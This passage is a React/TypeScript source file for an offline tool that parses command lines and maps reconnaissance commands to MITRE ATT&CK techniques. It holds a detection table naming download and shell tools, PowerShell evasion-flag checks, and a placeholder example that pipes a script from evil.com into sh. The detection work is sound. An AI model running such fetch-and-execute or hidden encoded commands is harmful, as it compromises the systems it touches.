/**
 * CommandLineAnalyzerTool.tsx — Offline command-line recon parser & MITRE mapper.
 *
 * 100% offline. No fetch, no exec, no shell-out, no `eval`, no `Function`
 * constructor. The user pastes a single command line and selects a shell
 * type (Windows CMD / PowerShell / Linux Shell). The tool tokenizes the line
 * (respecting single/double quotes, backslash / backtick escapes, and `;`,
 * `|`, `&&`, `||` command separators), classifies tokens into executable +
 * arguments + switches, recursively unwraps wrapper invocations
 * (`cmd.exe /c …`, `powershell -Command …`, `bash -c '…'`), and identifies
 * recon commands anywhere in the line — including inside wrapped commands.
 *
 * Each detected recon command maps to a potential MITRE ATT&CK technique with
 * a `[Open in MITRE]` external link. The language is hedged ("Potential",
 * "Possible"): many recon commands are also used by legitimate admins, so
 * detection does NOT imply malicious intent.
 *
 * Cross-tool integration:
 *   - [Open in IoC Extractor] → seeds IoC Extractor with the raw command
 *     line so IPs / URLs / hashes can be extracted (useIocStore).
 *   - [Add to Note] → enqueues a "Command Line Analysis" note with the
 *     parsed summary as HTML (useNoteStore). All user input is escaped via
 *     `escapeHtml` before being embedded — no `dangerouslySetInnerHTML`.
 */
import React, { useMemo, useState } from 'react';
import {
  Terminal, SquareTerminal, ChevronRight, ExternalLink,
  Trash2, AlertTriangle, Search, Network, Server, Lightbulb,
} from 'lucide-react';
import { useIocStore } from '../../store/iocStore';
import { useNoteStore } from '../../store/noteStore';
import { mitreUrl } from '../../utils/mitreUrl';
import {
  Field, Row, InfoBanner, ErrorBanner, Tabs,
  inputCls, btnPrimary, btnGhost, btnDanger,
} from './_shared';

/* ---------- strict types ---------- */
type ShellType = 'cmd' | 'powershell' | 'linux';

interface ReconCommand {
  command: string;
  meaning: string;
  mitreId: string;
  mitreName: string;
}

interface ReconRule {
  tokens: string[];
  command: string;
  meaning: string;
  mitreId: string;
  mitreName: string;
}

interface Token {
  text: string;
  isSeparator: boolean;
  isQuoted: boolean;
}

interface SubFlagDetection {
  notes: string[];
  extraMitres: { id: string; name: string }[];
}

interface ParsedResult {
  hasInput: boolean;
  shellType: ShellType;
  executable: string;
  isWrapper: boolean;
  wrappedCommand: string | undefined;
  switches: string[];
  arguments: string[];
  detectedCommands: ReconCommand[];
  securityRelevance: string;
  potentialMitres: { techniqueId: string; name: string }[];
  notes: string[];
}

const EMPTY_RESULT: ParsedResult = {
  hasInput: false,
  shellType: 'cmd',
  executable: '',
  isWrapper: false,
  wrappedCommand: undefined,
  switches: [],
  arguments: [],
  detectedCommands: [],
  securityRelevance: '',
  potentialMitres: [],
  notes: [],
};

const MAX_INPUT = 8192;

/* ---------- tokenizer ----------
 * Splits a command line into tokens, respecting single/double quotes and
 * backslash / backtick escapes. The characters `;`, `|`, `&&`, `||` (when
 * OUTSIDE any quote) are emitted as their own separator tokens so the caller
 * can split the line into multiple sub-commands. Quote characters are
 * stripped from the resulting token text.
 */
function tokenize(input: string): Token[] {
  const tokens: Token[] = [];
  let current = '';
  let inSingle = false;
  let inDouble = false;
  let hasContent = false;
  let isQuoted = false;

  const pushCurrent = () => {
    if (hasContent) {
      tokens.push({ text: current, isSeparator: false, isQuoted });
    }
    current = '';
    hasContent = false;
    isQuoted = false;
  };

  let i = 0;
  while (i < input.length) {
    const c = input[i];

    if (inSingle) {
      if (c === "'") {
        inSingle = false;
      } else {
        current += c;
        hasContent = true;
      }
      i++;
      continue;
    }
    if (inDouble) {
      if (c === '"') {
        inDouble = false;
      } else {
        current += c;
        hasContent = true;
      }
      i++;
      continue;
    }

    // Not in a quote
    if (c === "'" || c === '"') {
      if (c === "'") inSingle = true;
      else inDouble = true;
      isQuoted = true;
      hasContent = true; // an empty quoted segment ("") is still a token
      i++;
      continue;
    }

    // Escapes: backslash (Linux) or backtick (PowerShell) — take next char literally
    if (c === '\\' || c === '`') {
      if (i + 1 < input.length) {
        current += input[i + 1];
        hasContent = true;
        i += 2;
        continue;
      }
      // dangling escape — keep the char as-is
      current += c;
      hasContent = true;
      i++;
      continue;
    }

    // Whitespace ends a token
    if (c === ' ' || c === '\t' || c === '\n' || c === '\r') {
      pushCurrent();
      i++;
      continue;
    }

    // Separators: ; | && || (when outside quotes)
    if (c === ';') {
      pushCurrent();
      tokens.push({ text: ';', isSeparator: true, isQuoted: false });
      i++;
      continue;
    }
    if (c === '|') {
      if (input[i + 1] === '|') {
        pushCurrent();
        tokens.push({ text: '||', isSeparator: true, isQuoted: false });
        i += 2;
        continue;
      }
      pushCurrent();
      tokens.push({ text: '|', isSeparator: true, isQuoted: false });
      i++;
      continue;
    }
    if (c === '&') {
      if (input[i + 1] === '&') {
        pushCurrent();
        tokens.push({ text: '&&', isSeparator: true, isQuoted: false });
        i += 2;
        continue;
      }
      // Single & — PowerShell background operator; treat as a normal char.
      current += c;
      hasContent = true;
      i++;
      continue;
    }

    current += c;
    hasContent = true;
    i++;
  }

  pushCurrent();
  return tokens;
}

/* ---------- split tokens into sub-commands on separator tokens ---------- */
function splitSubCommands(tokens: Token[]): Token[][] {
  const subs: Token[][] = [];
  let cur: Token[] = [];
  for (const tok of tokens) {
    if (tok.isSeparator) {
      if (cur.length > 0) subs.push(cur);
      cur = [];
    } else {
      cur.push(tok);
    }
  }
  if (cur.length > 0) subs.push(cur);
  return subs;
}

/* ---------- switch classifier ---------- */
function isSwitch(token: string): boolean {
  if (token.length < 2) return false;
  return token.startsWith('/') || token.startsWith('-');
}

/* ---------- wrapper detection ---------- */
const CMD_WRAPPERS = new Set(['cmd', 'cmd.exe']);
const PWSH_WRAPPERS = new Set(['powershell', 'powershell.exe', 'pwsh', 'pwsh.exe']);
const SH_WRAPPERS = new Set(['bash', 'sh', 'dash', 'zsh', 'ash']);

function detectWrapper(sub: Token[]): { isWrapper: boolean; wrappedCommand: string | undefined } {
  if (sub.length < 3) return { isWrapper: false, wrappedCommand: undefined };
  const exec = sub[0].text.toLowerCase();
  const isCmd = CMD_WRAPPERS.has(exec);
  const isPwsh = PWSH_WRAPPERS.has(exec);
  const isSh = SH_WRAPPERS.has(exec);
  if (!isCmd && !isPwsh && !isSh) {
    return { isWrapper: false, wrappedCommand: undefined };
  }
  // Walk token 1..length-2 so that wrappedCommand = token after the flag.
  for (let i = 1; i < sub.length - 1; i++) {
    const t = sub[i].text.toLowerCase();
    let flag = false;
    if (isCmd && (t === '/c' || t === '/k' || t === '/r')) flag = true;
    if (isPwsh && (t === '-c' || t === '-command' || t === '--command')) flag = true;
    if (isSh && t === '-c') flag = true;
    if (flag) {
      return { isWrapper: true, wrappedCommand: sub[i + 1].text };
    }
  }
  return { isWrapper: false, wrappedCommand: undefined };
}

/* ---------- collect all tokens (recursively unwrapping nested wrappers) ---------- */
function collectAllTokens(subs: Token[][], depth: number, acc: string[] = []): string[] {
  if (depth > 4) return acc; // hard cap to prevent infinite recursion on pathological input
  for (const sub of subs) {
    for (const tok of sub) acc.push(tok.text);
    const w = detectWrapper(sub);
    if (w.isWrapper && w.wrappedCommand) {
      const inner = tokenize(w.wrappedCommand);
      collectAllTokens(splitSubCommands(inner), depth + 1, acc);
    }
  }
  return acc;
}

/* ---------- MITRE URL builder: shared helper from ../../utils/mitreUrl ---------- */

/* ---------- recon rule table ----------
 * Single-token and multi-token (phrase) rules are mixed. Each rule maps a
 * concrete command sequence (case-insensitive, exact token match) to a
 * MITRE technique. The `command` field is the user-facing display name.
 */
const RECON_RULES: ReconRule[] = [
  // === User discovery ===
  { tokens: ['whoami'], command: 'whoami', meaning: 'User Discovery', mitreId: 'T1033', mitreName: 'System Owner/User Discovery' },
  { tokens: ['id'], command: 'id', meaning: 'User Discovery', mitreId: 'T1033', mitreName: 'System Owner/User Discovery' },
  { tokens: ['klist'], command: 'klist', meaning: 'Kerberos Ticket Enumeration', mitreId: 'T1018', mitreName: 'Remote System Discovery' },

  // === Network configuration discovery ===
  { tokens: ['ipconfig'], command: 'ipconfig', meaning: 'Network Configuration Discovery', mitreId: 'T1016', mitreName: 'System Network Configuration Discovery' },
  { tokens: ['ifconfig'], command: 'ifconfig', meaning: 'Network Configuration Discovery', mitreId: 'T1016', mitreName: 'System Network Configuration Discovery' },
  { tokens: ['arp'], command: 'arp', meaning: 'Network Configuration Discovery', mitreId: 'T1016', mitreName: 'System Network Configuration Discovery' },
  { tokens: ['ip', 'addr'], command: 'ip addr', meaning: 'Network Configuration Discovery', mitreId: 'T1016', mitreName: 'System Network Configuration Discovery' },
  { tokens: ['ip', 'route'], command: 'ip route', meaning: 'Network Configuration Discovery', mitreId: 'T1016', mitreName: 'System Network Configuration Discovery' },
  { tokens: ['route', 'print'], command: 'route print', meaning: 'Network Configuration Discovery', mitreId: 'T1016', mitreName: 'System Network Configuration Discovery' },
  { tokens: ['arp', '-a'], command: 'arp -a', meaning: 'Network Configuration Discovery', mitreId: 'T1016', mitreName: 'System Network Configuration Discovery' },
  { tokens: ['Get-NetIPConfiguration'], command: 'Get-NetIPConfiguration', meaning: 'Network Configuration Discovery', mitreId: 'T1016', mitreName: 'System Network Configuration Discovery' },

  // === Account discovery ===
  { tokens: ['net', 'user'], command: 'net user', meaning: 'Account Discovery', mitreId: 'T1087', mitreName: 'Account Discovery' },
  { tokens: ['net', 'localgroup'], command: 'net localgroup', meaning: 'Account Discovery', mitreId: 'T1087', mitreName: 'Account Discovery' },
  { tokens: ['net', 'group'], command: 'net group', meaning: 'Account Discovery', mitreId: 'T1087', mitreName: 'Account Discovery' },
  { tokens: ['getent', 'passwd'], command: 'getent passwd', meaning: 'Account Discovery', mitreId: 'T1087', mitreName: 'Account Discovery' },
  { tokens: ['whoami', '/groups'], command: 'whoami /groups', meaning: 'Domain Account Discovery', mitreId: 'T1087.002', mitreName: 'Domain Account' },
  { tokens: ['dsquery'], command: 'dsquery', meaning: 'Domain Account Discovery', mitreId: 'T1087.002', mitreName: 'Domain Account' },
  { tokens: ['Get-LocalUser'], command: 'Get-LocalUser', meaning: 'Account Discovery', mitreId: 'T1087', mitreName: 'Account Discovery' },
  { tokens: ['Get-ADUser'], command: 'Get-ADUser', meaning: 'Account Discovery', mitreId: 'T1087', mitreName: 'Account Discovery' },

  // === Network share / mapped drive discovery ===
  { tokens: ['net', 'view'], command: 'net view', meaning: 'Network Share Discovery', mitreId: 'T1135', mitreName: 'Network Share Discovery' },
  { tokens: ['net', 'share'], command: 'net share', meaning: 'Network Share Discovery', mitreId: 'T1135', mitreName: 'Network Share Discovery' },
  { tokens: ['smbclient'], command: 'smbclient', meaning: 'Network Share Discovery', mitreId: 'T1135', mitreName: 'Network Share Discovery' },
  { tokens: ['smbclient', '-L'], command: 'smbclient -L', meaning: 'Network Share Discovery', mitreId: 'T1135', mitreName: 'Network Share Discovery' },
  { tokens: ['net', 'use'], command: 'net use', meaning: 'Mapped Drive / Local Account Discovery', mitreId: 'T1087.001', mitreName: 'Local Account' },
  { tokens: ['Get-SmbMapping'], command: 'Get-SmbMapping', meaning: 'Mapped Drive / Local Account Discovery', mitreId: 'T1087.001', mitreName: 'Local Account' },

  // === Process discovery ===
  { tokens: ['tasklist'], command: 'tasklist', meaning: 'Process Discovery', mitreId: 'T1057', mitreName: 'Process Discovery' },
  { tokens: ['ps'], command: 'ps', meaning: 'Process Discovery', mitreId: 'T1057', mitreName: 'Process Discovery' },
  { tokens: ['ps', 'aux'], command: 'ps aux', meaning: 'Process Discovery', mitreId: 'T1057', mitreName: 'Process Discovery' },
  { tokens: ['Get-Process'], command: 'Get-Process', meaning: 'Process Discovery', mitreId: 'T1057', mitreName: 'Process Discovery' },
  { tokens: ['process', 'list'], command: 'process list', meaning: 'Process Discovery', mitreId: 'T1057', mitreName: 'Process Discovery' },

  // === System information discovery ===
  { tokens: ['systeminfo'], command: 'systeminfo', meaning: 'System Information Discovery', mitreId: 'T1082', mitreName: 'System Information Discovery' },
  { tokens: ['uname'], command: 'uname', meaning: 'System Information Discovery', mitreId: 'T1082', mitreName: 'System Information Discovery' },
  { tokens: ['hostname'], command: 'hostname', meaning: 'System Information Discovery', mitreId: 'T1082', mitreName: 'System Information Discovery' },
  { tokens: ['ver'], command: 'ver', meaning: 'System Information Discovery', mitreId: 'T1082', mitreName: 'System Information Discovery' },

  // === Scheduled task / job ===
  { tokens: ['schtasks'], command: 'schtasks', meaning: 'Scheduled Task/Job', mitreId: 'T1053', mitreName: 'Scheduled Task/Job' },
  { tokens: ['schtasks', '/query'], command: 'schtasks /query', meaning: 'Scheduled Task/Job', mitreId: 'T1053', mitreName: 'Scheduled Task/Job' },
  { tokens: ['crontab'], command: 'crontab', meaning: 'Scheduled Task/Job', mitreId: 'T1053', mitreName: 'Scheduled Task/Job' },
  { tokens: ['crontab', '-l'], command: 'crontab -l', meaning: 'Scheduled Task/Job', mitreId: 'T1053', mitreName: 'Scheduled Task/Job' },
  { tokens: ['at'], command: 'at', meaning: 'Scheduled Task/Job', mitreId: 'T1053', mitreName: 'Scheduled Task/Job' },

  // === System services ===
  { tokens: ['sc'], command: 'sc', meaning: 'System Services', mitreId: 'T1569', mitreName: 'System Services' },
  { tokens: ['sc.exe'], command: 'sc.exe', meaning: 'System Services', mitreId: 'T1569', mitreName: 'System Services' },
  { tokens: ['sc', 'query'], command: 'sc query', meaning: 'System Services', mitreId: 'T1569', mitreName: 'System Services' },
  { tokens: ['sc.exe', 'query'], command: 'sc.exe query', meaning: 'System Services', mitreId: 'T1569', mitreName: 'System Services' },
  { tokens: ['systemctl'], command: 'systemctl', meaning: 'System Services', mitreId: 'T1569', mitreName: 'System Services' },
  { tokens: ['systemctl', 'list-units'], command: 'systemctl list-units', meaning: 'System Services', mitreId: 'T1569', mitreName: 'System Services' },
  { tokens: ['service'], command: 'service', meaning: 'System Services', mitreId: 'T1569', mitreName: 'System Services' },
  { tokens: ['service', '--status-all'], command: 'service --status-all', meaning: 'System Services', mitreId: 'T1569', mitreName: 'System Services' },

  // === WMI ===
  { tokens: ['wmic'], command: 'wmic', meaning: 'WMI', mitreId: 'T1047', mitreName: 'Windows Management Instrumentation' },
  { tokens: ['Get-WmiObject'], command: 'Get-WmiObject', meaning: 'WMI', mitreId: 'T1047', mitreName: 'Windows Management Instrumentation' },

  // === Ingress tool transfer ===
  { tokens: ['curl'], command: 'curl', meaning: 'Ingress Tool Transfer', mitreId: 'T1105', mitreName: 'Ingress Tool Transfer' },
  { tokens: ['wget'], command: 'wget', meaning: 'Ingress Tool Transfer', mitreId: 'T1105', mitreName: 'Ingress Tool Transfer' },
  { tokens: ['Invoke-WebRequest'], command: 'Invoke-WebRequest', meaning: 'Ingress Tool Transfer', mitreId: 'T1105', mitreName: 'Ingress Tool Transfer' },
  { tokens: ['Invoke-RestMethod'], command: 'Invoke-RestMethod', meaning: 'Ingress Tool Transfer', mitreId: 'T1105', mitreName: 'Ingress Tool Transfer' },

  // === File and directory permissions modification ===
  { tokens: ['chmod'], command: 'chmod', meaning: 'File and Directory Permissions Modification', mitreId: 'T1222', mitreName: 'File and Directory Permissions Modification' },
  { tokens: ['chown'], command: 'chown', meaning: 'File and Directory Permissions Modification', mitreId: 'T1222', mitreName: 'File and Directory Permissions Modification' },
  { tokens: ['icacls'], command: 'icacls', meaning: 'File and Directory Permissions Modification', mitreId: 'T1222', mitreName: 'File and Directory Permissions Modification' },
  { tokens: ['cacls'], command: 'cacls', meaning: 'File and Directory Permissions Modification', mitreId: 'T1222', mitreName: 'File and Directory Permissions Modification' },
  { tokens: ['attrib'], command: 'attrib', meaning: 'File and Directory Permissions Modification', mitreId: 'T1222', mitreName: 'File and Directory Permissions Modification' },

  // === File and directory discovery ===
  { tokens: ['find'], command: 'find', meaning: 'File and Directory Discovery', mitreId: 'T1083', mitreName: 'File and Directory Discovery' },
  { tokens: ['grep'], command: 'grep', meaning: 'File and Directory Discovery', mitreId: 'T1083', mitreName: 'File and Directory Discovery' },
  { tokens: ['Select-String'], command: 'Select-String', meaning: 'File and Directory Discovery', mitreId: 'T1083', mitreName: 'File and Directory Discovery' },
  { tokens: ['dir'], command: 'dir', meaning: 'File and Directory Discovery', mitreId: 'T1083', mitreName: 'File and Directory Discovery' },
  { tokens: ['ls'], command: 'ls', meaning: 'File and Directory Discovery', mitreId: 'T1083', mitreName: 'File and Directory Discovery' },
  { tokens: ['Get-ChildItem'], command: 'Get-ChildItem', meaning: 'File and Directory Discovery', mitreId: 'T1083', mitreName: 'File and Directory Discovery' },
  { tokens: ['dir', '/s'], command: 'dir /s', meaning: 'File and Directory Discovery', mitreId: 'T1083', mitreName: 'File and Directory Discovery' },
  { tokens: ['ls', '-R'], command: 'ls -R', meaning: 'File and Directory Discovery', mitreId: 'T1083', mitreName: 'File and Directory Discovery' },

  // === Network connections discovery ===
  { tokens: ['netstat'], command: 'netstat', meaning: 'Network Connections Discovery', mitreId: 'T1049', mitreName: 'System Network Connections Discovery' },
  { tokens: ['ss'], command: 'ss', meaning: 'Network Connections Discovery', mitreId: 'T1049', mitreName: 'System Network Connections Discovery' },
  { tokens: ['Get-NetTCPConnection'], command: 'Get-NetTCPConnection', meaning: 'Network Connections Discovery', mitreId: 'T1049', mitreName: 'System Network Connections Discovery' },

  // === Query registry ===
  { tokens: ['reg'], command: 'reg', meaning: 'Query Registry', mitreId: 'T1012', mitreName: 'Query Registry' },
  { tokens: ['regedit'], command: 'regedit', meaning: 'Query Registry', mitreId: 'T1012', mitreName: 'Query Registry' },
  { tokens: ['reg', 'query'], command: 'reg query', meaning: 'Query Registry', mitreId: 'T1012', mitreName: 'Query Registry' },
  { tokens: ['regedit', '/e'], command: 'regedit /e', meaning: 'Query Registry', mitreId: 'T1012', mitreName: 'Query Registry' },

  // === Process termination / impair defenses ===
  { tokens: ['taskkill'], command: 'taskkill', meaning: 'Process Termination / Impair Defenses', mitreId: 'T1562', mitreName: 'Impair Defenses' },
  { tokens: ['kill'], command: 'kill', meaning: 'Process Termination / Impair Defenses', mitreId: 'T1562', mitreName: 'Impair Defenses' },
  { tokens: ['killall'], command: 'killall', meaning: 'Process Termination / Impair Defenses', mitreId: 'T1562', mitreName: 'Impair Defenses' },
  { tokens: ['Stop-Process'], command: 'Stop-Process', meaning: 'Process Termination / Impair Defenses', mitreId: 'T1562', mitreName: 'Impair Defenses' },

  // === Command and scripting interpreter ===
  { tokens: ['powershell'], command: 'powershell', meaning: 'PowerShell', mitreId: 'T1059.001', mitreName: 'PowerShell' },
  { tokens: ['powershell.exe'], command: 'powershell.exe', meaning: 'PowerShell', mitreId: 'T1059.001', mitreName: 'PowerShell' },
  { tokens: ['pwsh'], command: 'pwsh', meaning: 'PowerShell', mitreId: 'T1059.001', mitreName: 'PowerShell' },
  { tokens: ['pwsh.exe'], command: 'pwsh.exe', meaning: 'PowerShell', mitreId: 'T1059.001', mitreName: 'PowerShell' },
  { tokens: ['bash'], command: 'bash', meaning: 'Unix Shell', mitreId: 'T1059.004', mitreName: 'Unix Shell' },
  { tokens: ['sh'], command: 'sh', meaning: 'Unix Shell', mitreId: 'T1059.004', mitreName: 'Unix Shell' },
  { tokens: ['dash'], command: 'dash', meaning: 'Unix Shell', mitreId: 'T1059.004', mitreName: 'Unix Shell' },
  { tokens: ['zsh'], command: 'zsh', meaning: 'Unix Shell', mitreId: 'T1059.004', mitreName: 'Unix Shell' },
  { tokens: ['cmd'], command: 'cmd', meaning: 'Windows Command Shell', mitreId: 'T1059.003', mitreName: 'Windows Command Shell' },
  { tokens: ['cmd.exe'], command: 'cmd.exe', meaning: 'Windows Command Shell', mitreId: 'T1059.003', mitreName: 'Windows Command Shell' },
  { tokens: ['python'], command: 'python', meaning: 'Python', mitreId: 'T1059.006', mitreName: 'Python' },
  { tokens: ['python3'], command: 'python3', meaning: 'Python', mitreId: 'T1059.006', mitreName: 'Python' },
  { tokens: ['perl'], command: 'perl', meaning: 'Unix Shell (Scripting)', mitreId: 'T1059.004', mitreName: 'Unix Shell' },
  { tokens: ['ruby'], command: 'ruby', meaning: 'Unix Shell (Scripting)', mitreId: 'T1059.004', mitreName: 'Unix Shell' },
  { tokens: ['node'], command: 'node', meaning: 'JavaScript', mitreId: 'T1059.007', mitreName: 'JavaScript' },

  // === Domain trust discovery ===
  { tokens: ['nltest'], command: 'nltest', meaning: 'Domain Trust Discovery', mitreId: 'T1482', mitreName: 'Domain Trust Discovery' },
  { tokens: ['nltest', '/domain_trusts'], command: 'nltest /domain_trusts', meaning: 'Domain Trust Discovery', mitreId: 'T1482', mitreName: 'Domain Trust Discovery' },
];

/* ---------- PowerShell suspicious sub-flag detection ---------- */
function detectSubFlags(tokens: Token[]): SubFlagDetection {
  const notes: string[] = [];
  const extraMitres: { id: string; name: string }[] = [];
  const lower = tokens.map(t => t.text.toLowerCase());

  if (lower.some(t => t === '-enc' || t === '-encodedcommand' || t === '--encodedcommand')) {
    notes.push('Encoded payload flag detected (-enc / -EncodedCommand). Possible obfuscation — payload would need to be Base64-decoded to inspect further.');
    extraMitres.push({ id: 'T1027', name: 'Obfuscated Files or Information' });
  }

  // Hidden window: -w hidden / -WindowStyle hidden / -w 1 / -w hid
  for (let i = 0; i < lower.length - 1; i++) {
    const t = lower[i];
    const next = lower[i + 1];
    if (t === '-w' || t === '-windowstyle' || t === '--windowstyle') {
      if (next === 'hidden' || next === '1' || next === 'hid') {
        notes.push('Hidden window flag detected (-w hidden). Possible defense evasion — the PowerShell window is hidden from the user.');
        extraMitres.push({ id: 'T1564.003', name: 'Hidden Window' });
        break;
      }
    }
  }

  if (lower.some(t => t === '-nop' || t === '-noprofile')) {
    notes.push('No-profile flag (-nop). Commonly used by malicious PowerShell to skip loading the user\'s profile scripts.');
  }

  // ExecutionPolicy bypass
  for (let i = 0; i < lower.length - 1; i++) {
    if ((lower[i] === '-ep' || lower[i] === '-executionpolicy' || lower[i] === '--executionpolicy') && lower[i + 1] === 'bypass') {
      notes.push('Execution policy bypass flag (-ep bypass). Disables PowerShell execution policy for this session — common in malicious scripts.');
      break;
    }
  }

  // PowerShell invocation from a remote / downloaded file
  if (lower.some(t => t === '-file' || t === '-f')) {
    notes.push('Script file flag (-file / -f). PowerShell is being asked to execute a .ps1 file — review the file path for suspicious locations (Temp / user AppData).');
  }

  return { notes, extraMitres };
}

/* ---------- main analyzer ---------- */
function analyze(shell: ShellType, input: string): ParsedResult {
  const trimmed = input.trim();
  if (!trimmed) return { ...EMPTY_RESULT, shellType: shell };

  const topTokens = tokenize(trimmed);
  const subCommands = splitSubCommands(topTokens);
  const firstSub = subCommands[0] || [];

  const executable = firstSub[0]?.text || '';

  // Top-level switches / args (from the first sub-command only — the actual
  // command being typed, before any compound `|` / `;` continuation).
  const switches: string[] = [];
  const args: string[] = [];
  for (let i = 1; i < firstSub.length; i++) {
    const t = firstSub[i].text;
    if (isSwitch(t)) switches.push(t);
    else args.push(t);
  }

  // Wrapper detection (top-level only — the user-typed wrapper is what
  // matters for the "Wrapped command" display field).
  const wrapper = detectWrapper(firstSub);

  // Recon detection across the full token set (including nested wrapped
  // commands, recursively).
  const allTokens = collectAllTokens(subCommands, 0);
  const lower = allTokens.map(t => t.toLowerCase());

  const detected: ReconCommand[] = [];
  const seenCommands = new Set<string>();
  for (const rule of RECON_RULES) {
    const pat = rule.tokens.map(t => t.toLowerCase());
    const plen = pat.length;
    for (let i = 0; i <= lower.length - plen; i++) {
      let match = true;
      for (let j = 0; j < plen; j++) {
        if (lower[i + j] !== pat[j]) { match = false; break; }
      }
      if (match) {
        if (!seenCommands.has(rule.command)) {
          seenCommands.add(rule.command);
          detected.push({
            command: rule.command,
            meaning: rule.meaning,
            mitreId: rule.mitreId,
            mitreName: rule.mitreName,
          });
        }
        break; // rule matched — don't double-count within the same rule
      }
    }
  }

  // Build MITRE list (dedupe by mitreId, preserve first-seen order).
  const mitreMap = new Map<string, string>();
  for (const d of detected) {
    if (!mitreMap.has(d.mitreId)) mitreMap.set(d.mitreId, d.mitreName);
  }

  // Sub-flag detection (PowerShell suspicious flags). Extra MITRE entries are
  // surfaced when -enc / -w hidden are present.
  const sub = detectSubFlags(topTokens);
  for (const m of sub.extraMitres) {
    if (!mitreMap.has(m.id)) mitreMap.set(m.id, m.name);
  }

  // Security relevance = unique meanings joined with " / ".
  const seenMeanings = new Set<string>();
  for (const d of detected) seenMeanings.add(d.meaning);
  const securityRelevance = [...seenMeanings].join(' / ');

  return {
    hasInput: true,
    shellType: shell,
    executable,
    isWrapper: wrapper.isWrapper,
    wrappedCommand: wrapper.wrappedCommand,
    switches,
    arguments: args,
    detectedCommands: detected,
    securityRelevance,
    potentialMitres: [...mitreMap.entries()].map(([techniqueId, name]) => ({ techniqueId, name })),
    notes: sub.notes,
  };
}

/* ---------- HTML escaping (no dangerouslySetInnerHTML ever) ---------- */
function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/* ---------- build summary HTML for [Add to Note] ---------- */
function buildSummaryHtml(input: string, r: ParsedResult): string {
  const parts: string[] = [];
  parts.push('<h1>Command Line Analysis</h1>');
  parts.push(`<pre>${escapeHtml(input)}</pre>`);
  parts.push('<h2>Parsed</h2>');
  parts.push(`<p><strong>Shell type:</strong> ${escapeHtml(r.shellType)}</p>`);
  parts.push(`<p><strong>Executable:</strong> <code>${escapeHtml(r.executable)}</code></p>`);
  if (r.isWrapper && r.wrappedCommand) {
    parts.push(`<p><strong>Wrapped command:</strong> <code>${escapeHtml(r.wrappedCommand)}</code></p>`);
  }
  parts.push(`<p><strong>Switches:</strong> ${r.switches.length ? r.switches.map(s => `<code>${escapeHtml(s)}</code>`).join(' ') : '(none)'}</p>`);
  parts.push(`<p><strong>Arguments:</strong> ${r.arguments.length ? r.arguments.map(a => `<code>${escapeHtml(a)}</code>`).join(' ') : '(none)'}</p>`);
  parts.push('<h2>Detected commands</h2>');
  if (r.detectedCommands.length === 0) {
    parts.push('<p><em>No recon commands detected.</em></p>');
  } else {
    parts.push('<ul>');
    for (const d of r.detectedCommands) {
      parts.push(`<li><code>${escapeHtml(d.command)}</code> — ${escapeHtml(d.meaning)} (MITRE ${d.mitreId} — ${escapeHtml(d.mitreName)})</li>`);
    }
    parts.push('</ul>');
  }
  if (r.securityRelevance) {
    parts.push(`<p><strong>Security relevance:</strong> ${escapeHtml(r.securityRelevance)}</p>`);
  }
  parts.push('<h2>Potential MITRE ATT&amp;CK</h2>');
  if (r.potentialMitres.length === 0) {
    parts.push('<p><em>None.</em></p>');
  } else {
    parts.push('<ul>');
    for (const m of r.potentialMitres) {
      parts.push(`<li>${m.techniqueId} — ${escapeHtml(m.name)} (<a href="${mitreUrl(m.techniqueId)}">MITRE</a>)</li>`);
    }
    parts.push('</ul>');
  }
  if (r.notes.length > 0) {
    parts.push('<h2>Sub-detections</h2><ul>');
    for (const n of r.notes) parts.push(`<li>${escapeHtml(n)}</li>`);
    parts.push('</ul>');
  }
  return parts.join('');
}

/* ---------- shell type tabs ---------- */
const SHELL_TABS: { id: string; label: string; icon: React.ReactNode }[] = [
  { id: 'cmd', label: 'Windows CMD', icon: <Terminal className="w-3.5 h-3.5" /> },
  { id: 'powershell', label: 'PowerShell', icon: <SquareTerminal className="w-3.5 h-3.5" /> },
  { id: 'linux', label: 'Linux Shell', icon: <Terminal className="w-3.5 h-3.5" /> },
];

/* ---------- main component ---------- */
export const CommandLineAnalyzerTool: React.FC = () => {
  const [shell, setShell] = useState<ShellType>('cmd');
  const [input, setInput] = useState('');

  const tooLong = input.length > MAX_INPUT;
  const result = useMemo<ParsedResult>(
    () => (tooLong ? EMPTY_RESULT : analyze(shell, input)),
    [shell, input, tooLong],
  );

  const handleClear = () => setInput('');
  const handleSendToIoc = () => {
    if (!input.trim()) return;
    useIocStore.getState().setPendingText(input);
  };
  const handleAddToNote = () => {
    if (!input.trim()) return;
    useNoteStore.getState().enqueueNote('Command Line Analysis', buildSummaryHtml(input, result));
  };

  return (
    <div className="space-y-3">
      <Tabs tabs={SHELL_TABS} active={shell} onChange={(id: string) => setShell(id as ShellType)} />

      <Field label="Command line" hint="Paste a single command line. Wrapper invocations (cmd /c, powershell -c, bash -c) are unwrapped recursively.">
        <input
          type="text"
          className={inputCls}
          value={input}
          onChange={(e: React.ChangeEvent<HTMLInputElement>) => setInput(e.target.value)}
          placeholder="e.g. cmd.exe /c whoami  ·  powershell -nop -w hidden -enc AAAA=  ·  bash -c 'curl http://evil.com/payload.sh | sh'"
          spellCheck={false}
          autoComplete="off"
        />
      </Field>

      <div className="flex flex-wrap gap-2">
        <button type="button" onClick={handleClear} className={btnDanger} disabled={!input}>
          <span className="inline-flex items-center gap-1.5"><Trash2 className="w-3.5 h-3.5" /> Clear</span>
        </button>
      </div>

      {tooLong ? (
        <ErrorBanner message={`Input exceeds ${MAX_INPUT} characters — truncated for safety. Please paste a shorter command line.`} />
      ) : result.hasInput ? (
        <div className="space-y-3">
          {/* Parsed structure */}
          <div className="border border-[#262626] rounded p-3 space-y-1">
            <div className="text-[10px] font-bold uppercase tracking-widest text-blue-400 mb-2">Parsed</div>
            <Row label="Executable" value={<code className="font-mono text-green-300">{result.executable || '(none)'}</code>} />
            <Row label="Shell type" value={result.shellType} />
            {result.isWrapper && result.wrappedCommand ? (
              <Row label="Wrapped command" value={<code className="font-mono text-amber-300 break-all">{result.wrappedCommand}</code>} />
            ) : null}
            <Row label="Switches" value={result.switches.length ? result.switches.join(' ') : '(none)'} mono />
            <Row label="Arguments" value={result.arguments.length ? result.arguments.join(' ') : '(none)'} mono />
          </div>

          {/* Sub-detections (PowerShell suspicious flags) */}
          {result.notes.length > 0 ? (
            <div className="border border-amber-500/40 bg-amber-500/5 rounded p-3 space-y-1">
              <div className="text-[10px] font-bold uppercase tracking-widest text-amber-400 mb-2 flex items-center gap-1.5">
